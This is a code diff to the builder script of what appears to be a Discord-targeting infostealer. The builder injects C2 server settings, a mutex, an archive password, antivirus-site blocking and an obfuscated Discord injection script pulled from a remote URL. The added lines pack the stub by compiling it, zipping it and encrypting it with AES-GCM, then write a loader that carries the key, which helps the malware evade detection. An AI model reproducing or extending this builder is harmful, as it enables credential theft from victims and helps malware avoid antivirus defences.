@@ -4,6 +4,9 @@ import os
 import subprocess
 import random
 import string
+import py_compile
+import pyaes
+import zipfile
 
 from urllib3 import PoolManager, disable_warnings
 disable_warnings()
@@ -16,6 +19,7 @@ OutCodeFile = "stub-o.py"
 InjectionURL = "https://raw.githubusercontent.com/Blank-c/Discord-Injection-BG/main/injection-obfuscated.js"
 
 def WriteSettings(code: str, settings: dict, injection: str) -> str:
+    code = code.replace('__name__ == "__main__" and ', '')
     code = code.replace('"%c2%"', "(%d, %s)" % (settings["settings"]["c2"][0], EncryptString(settings["settings"]["c2"][1])))
     code = code.replace('"%mutex%"', EncryptString(settings["settings"]["mutex"]))
     code = code.replace('"%archivepassword%"', EncryptString(settings["settings"]["archivePassword"]))
@@ -47,7 +51,6 @@ def WriteSettings(code: str, settings: dict, injection: str) -> str:
 
     code = code.replace('%blockavsites%', "true" if settings["modules"]["blockAvSites"] else "")
     code = code.replace('%discordinjection%', "true" if settings["modules"]["discordInjection"] else "")
-
 
     if injection is not None:
         code = code.replace("%injectionbase64encoded%", base64.b64encode(injection.encode()).decode())
@@ -156,7 +159,30 @@ def main() -> None:
 
     obfuscator.BlankOBF(code, OutCodeFile)
     junk(OutCodeFile)
+
+    compiledFile = "stub-o.pyc"
+    zipFile = "blank.aes"
+    py_compile.compile(OutCodeFile, compiledFile)
+    os.remove(OutCodeFile)
+    with zipfile.ZipFile(zipFile, "w") as zip:
+        zip.write(compiledFile)
+    os.remove(compiledFile)
+
+    key = os.urandom(32)
+    iv = os.urandom(12)
+
+    encrypted = pyaes.AESModeOfOperationGCM(key, iv).encrypt(open(zipFile, "rb").read())
+    open(zipFile, "wb").write(encrypted)
     
+    with open("loader.py", "r") as file:
+        loader = file.read()
+
+    loader = loader.replace("%key%", base64.b64encode(key).decode())
+    loader = loader.replace("%iv%", base64.b64encode(iv).decode())
+
+    with open("loader-o.py", "w") as file:
+        file.write(loader)
+
     MakeVersionFileAndCert()
 
 if __name__ == "__main__":
